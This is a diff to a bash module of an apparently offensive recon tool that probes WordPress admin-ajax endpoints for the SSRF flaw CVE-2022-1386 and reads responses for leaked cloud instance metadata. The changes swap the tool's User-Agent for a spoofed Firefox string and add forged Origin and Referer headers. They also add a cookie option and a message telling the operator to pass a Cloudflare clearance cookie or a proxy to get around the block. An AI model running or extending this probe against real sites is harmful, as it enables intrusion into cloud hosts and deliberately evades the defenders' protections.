@@ -146,12 +146,15 @@ _ssrf_probe_cve_2022_1386() {
     else
         pybin=""
     fi
-    # Resolve helper even if SCRIPTPATH is wrong on the VPS.
+    # Resolve helper even if SCRIPTPATH is empty/wrong in the shell (common on VPS).
     json_helper=""
     for cand in \
-        "${SCRIPTPATH:-}/lib/ssrf_confirmed_json.py" \
+        ${SCRIPTPATH:+"${SCRIPTPATH}/lib/ssrf_confirmed_json.py"} \
         "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." 2>/dev/null && pwd)/lib/ssrf_confirmed_json.py" \
-        "./lib/ssrf_confirmed_json.py"; do
+        "/home/reconftw/lib/ssrf_confirmed_json.py" \
+        "${HOME:+${HOME}/reconftw/lib/ssrf_confirmed_json.py}" \
+        "./lib/ssrf_confirmed_json.py" \
+        "../lib/ssrf_confirmed_json.py"; do
         [[ -n "$cand" && -f "$cand" ]] && { json_helper="$cand"; break; }
     done
     mkdir -p .tmp vulns vulns/ssrf_requests
@@ -354,10 +357,15 @@ _ssrf_probe_cve_2022_1386() {
             _fb_resp=$(curl -sk -m 20 -X POST "$ajax_url" \
                 -H "Content-Type: multipart/form-data; boundary=${_fb_boundary}" \
                 -H "X-Requested-With: XMLHttpRequest" \
-                -H "User-Agent: reconFTW-ssrf-probe" \
+                -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
+                -H "Origin: ${ajax_url%/wp-admin/admin-ajax.php}" \
+                -H "Referer: ${ajax_url%/wp-admin/admin-ajax.php}/" \
                 ${HEADER:+-H "$HEADER"} \
+                ${SSRF_COOKIE:+-H "Cookie: $SSRF_COOKIE"} \
                 --data-binary "$_fb_body" 2>/dev/null || true)
-            if printf '%s' "$_fb_resp" | grep -aqE 'ami-id|instance-id|i-[0-9a-f]{8,}|local-ipv4'; then
+            if printf '%s' "$_fb_resp" | grep -aqiE 'Just a moment|cf-browser-verification|cdn-cgi/challenge'; then
+                printf 'CF_BLOCKED %s\n' "$ajax_url" >>".tmp/ssrf_cve1386_debug.txt"
+            elif printf '%s' "$_fb_resp" | grep -aqE 'ami-id|instance-id|i-[0-9a-f]{8,}|local-ipv4'; then
                 _fb_host=$(printf '%s' "$ajax_url" | sed -E 's#^https?://([^/]+)/.*#\1#; s/:(443|80)$//')
                 _fb_path=$(printf '%s' "$ajax_url" | sed -E 's#^https?://[^/]+##')
                 [[ -z "$_fb_path" ]] && _fb_path="/wp-admin/admin-ajax.php"
@@ -386,7 +394,11 @@ _ssrf_probe_cve_2022_1386() {
     if [[ -s ".tmp/ssrf_cve1386_hits.txt" ]]; then
         notification "SSRF: CVE-2022-1386 confirmed hit(s) → vulns/ssrf_confirmed.txt" warn
     else
-        _print_msg WARN "CVE-2022-1386: probed ${probed} endpoint(s), 0 confirmed — check .tmp/ssrf_cve1386_debug.txt (helper=${json_helper:-MISSING})"
+        if grep -aq '^CF_BLOCKED ' ".tmp/ssrf_cve1386_debug.txt" 2>/dev/null; then
+            _print_msg WARN "CVE-2022-1386: Cloudflare is blocking this VPS IP — set SSRF_COOKIE='cf_clearance=...' or probe via proxy. See .tmp/ssrf_cve1386_debug.txt"
+        else
+            _print_msg WARN "CVE-2022-1386: probed ${probed} endpoint(s), 0 confirmed — check .tmp/ssrf_cve1386_debug.txt (helper=${json_helper:-MISSING})"
+        fi
     fi
 }
 
@@ -601,7 +613,14 @@ function ssrf_checks() {
                 if [[ "$NUMOFLINES" -gt 0 ]] && command -v ffuf &>/dev/null && command -v jq &>/dev/null; then
                     _print_msg INFO "Running: Correlating OOB callbacks to source requests (ffuf -search)"
 
-                    local _ssrf_json_helper="${SCRIPTPATH}/lib/ssrf_confirmed_json.py"
+                    local _ssrf_json_helper=""
+                    for _cand in \
+                        ${SCRIPTPATH:+"${SCRIPTPATH}/lib/ssrf_confirmed_json.py"} \
+                        "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." 2>/dev/null && pwd)/lib/ssrf_confirmed_json.py" \
+                        "/home/reconftw/lib/ssrf_confirmed_json.py" \
+                        "./lib/ssrf_confirmed_json.py"; do
+                        [[ -n "$_cand" && -f "$_cand" ]] && { _ssrf_json_helper="$_cand"; break; }
+                    done
                     local _ssrf_pybin=python3
                     command -v python3 >/dev/null 2>&1 || _ssrf_pybin=python
 
